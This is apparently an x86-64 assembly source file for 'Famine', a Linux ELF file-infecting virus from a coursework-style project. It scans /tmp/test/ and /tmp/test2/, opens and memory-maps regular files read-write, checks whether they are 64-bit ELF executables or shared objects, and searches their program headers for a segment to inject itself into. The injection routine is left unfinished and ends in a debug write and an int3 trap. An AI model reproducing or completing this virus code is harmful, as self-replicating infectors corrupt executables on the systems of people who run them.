%include "includes/header.s"

global      _start                              ;must be declared for linker (ld)


_host:
	mov rax, _exit
	syscall


_start:   ;Entry-Point
	push rdi
	push rsi
	push rcx
	push rdx
	push rbp
	mov rbp, rsp
	sub rbp, famine_size
	
	
	lea rax, [rel _start]
	mov rdx, [rel famine_entry]
	sub rax, rdx
	add rax, [rel host_entry]
	push rax
	lea rdi, [rel infect_dir]
	
.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, STACK(famine.dir_fd)
	mov rax, _getdents
	syscall
	test  rax,rax
	jle .closedir
	xor r13, r13
	mov r12, rax

.file:
	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process

.nextfile:
	cmp r13, r12
	jl .file
	jmp .readdir

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	xor ecx, ecx
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb
	cmp byte[rdi], 0
	jnz .opendir
	pop rax
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp rax

process:
	mov rsi, r14
	mov rax, rdi
	lea rdi, STACK(famine.file_path)
	mov rdx, rdi

.dirname:
	movsb
	cmp byte [rsi], 0
	jnz .dirname
	mov rsi, rax

.filename:
	movsb
	cmp byte[rsi - 1], 0
	jnz .filename
	mov rdi, rdx
				;open file
	mov rsi, O_RDWR
	mov rax, _open
	syscall


	test eax, eax
	jl .return
	mov STACK(famine.file_fd), rax

				;stat
	lea rsi, STACK(famine.stat)
	mov rdi, rax
	mov rax, _fstat
	syscall
	cmp rax, 0
	jnz .close
	mov rsi, qword STACK(famine.stat + stat.st_size)
	mov STACK(famine.file_size), rsi
	cmp rsi, elf64_ehdr_size + elf64_phdr_size + FAMINE_SIZE
	jl .close
				;MMAP file
	xor r9, r9
	mov r8, STACK(famine.file_fd)
	mov r10, MAP_SHARED
	mov rdx, PROT_READ | PROT_WRITE
	xor rdi, rdi
	mov rax, _mmap
	syscall
	cmp rax, MMAP_ERRORS
	jae .close
	mov STACK(famine.file_data), rax
	mov rdi, rax
	call check_elf64
	test al,al
	jz .unmap
	call inject_self

.unmap:
	mov rsi, STACK(famine.file_size)
	mov rdi, STACK(famine.file_data)
	mov rax, _munmap
	syscall

.close:
	mov rdi, STACK(famine.file_fd)
	mov rax, _close
	syscall

.return:
	ret

check_elf64:
	xor rax, rax
	cmp qword[rdi+8], rax
	jnz .return
	mov rdx, _SYSV_			;elf SYSV
	cmp qword [rdi], rdx
	jz .continue
	mov rdx, _GNU_			;ELF_GNU
	cmp qword[rdi], rdx
	jnz .return

.continue:
	mov rdx, _DYN_
	cmp qword[rdi + 16], rdx
	jz .ok
	mov rdx, _EXEC_
	cmp qword[rdi + 16], rdx
	jnz .return
.ok:
	inc rax
.return:
	ret

inject_self:
	push r13
	push r14
	push r15
	mov r15, rdi
	mov rdx, qword [rdi + elf64_ehdr.e_entry]
	movzx rcx, word [rdi + elf64_ehdr.e_phnum]
	mov rax, qword[rdi + elf64_ehdr.e_phoff]
	add rdi,rax
	mov r14, rdi

	.segment:
	cmp rcx, 0
	jl .return
	mov ax, SEGMENT_TYPE
	mov r11w, word [rdi]
	cmp ax, r11w
	jnz .next
	jmp .infect

	.next:
	add rdi, elf64_phdr_size
	dec rcx
	jmp .segment

	.infect:
							;check if availables space in 0s
	mov rax, 1
	mov rdi, 1
	lea rsi, [infect_dir]
	mov rdx, 10
	syscall
	int3

	.return :
		pop r15
		pop r14
		pop r13
		ret

infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
signature		db			'Famine version 99.0 (c)oded by <araout>', 0xa
famine_entry	dq			_start
host_entry		dq			_host
_end:
